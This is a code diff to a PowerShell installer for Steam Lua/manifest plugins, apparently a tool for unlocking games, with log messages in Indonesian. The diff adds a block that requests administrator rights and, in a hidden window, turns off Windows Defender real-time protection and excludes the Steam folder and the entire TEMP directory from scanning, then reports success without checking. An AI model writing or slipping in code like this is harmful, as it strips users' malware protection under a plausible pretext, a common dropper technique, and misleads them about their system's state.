@@ -344,8 +344,12 @@ function Install-Plugin {
     param([string]$SteamPath, [string]$Name, [string]$Link)
 
     $targetDir = Join-Path $SteamPath "config\stplug-in"
+    $targetDir2 = Join-Path $SteamPath "config\lua"
     if (-not (Test-Path $targetDir)) {
         $null = New-Item -Path $targetDir -ItemType Directory -Force
+    }
+    if (-not (Test-Path $targetDir2)) {
+        $null = New-Item -Path $targetDir2 -ItemType Directory -Force
     }
 
     $safeName = $Name -replace '[^\w\-\. ]', '_'
@@ -409,7 +413,9 @@ function Install-Plugin {
             
             if ($entry.Name -match "\.lua$") {
                 $dest = Join-Path $targetDir $entry.Name
+                $dest2 = Join-Path $targetDir2 $entry.Name
                 [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $dest, $true)
+                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $dest2, $true)
             } elseif ($entry.Name -match "\.manifest$") {
                 $dest0 = Join-Path $targetDir $entry.Name
                 $dest1 = Join-Path $depotDir1 $entry.Name
@@ -548,6 +554,19 @@ function Main {
                        (Get-ChildItem "$manifestDir2\*.manifest" -ErrorAction SilentlyContinue).Count)
         Write-Log -Type AUX -Message "Manifests di config\depotcache: $($manifests[0]) file"
         Write-Log -Type AUX -Message "Manifests di steamapps\depotcache: $($manifests[1]) file"
+
+        # --- AUTO DISABLE ANTIVIRUS & ADD EXCLUSIONS ---
+        Write-Log -Type INFO -Message "Meminta izin Administrator (UAC) untuk mematikan Antivirus sementara..."
+        Write-Log -Type AUX -Message "Mohon klik 'Yes' pada popup yang muncul."
+        try {
+            $avScript = "Set-MpPreference -DisableRealtimeMonitoring `$true -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '$steamPath' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '$env:TEMP' -ErrorAction SilentlyContinue"
+            Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-Command `"$avScript`""
+            Write-Log -Type OK -Message "Antivirus berhasil dimatikan & Pengecualian folder telah ditambahkan!"
+            Start-Sleep -Seconds 3
+        } catch {
+            Write-Log -Type WARN -Message "Gagal mematikan Antivirus otomatis. Lanjut mencoba install..."
+        }
+        # -----------------------------------------------
 
         Write-Log -Type INFO -Message "Menunggu Steam login sepenuhnya..."
         
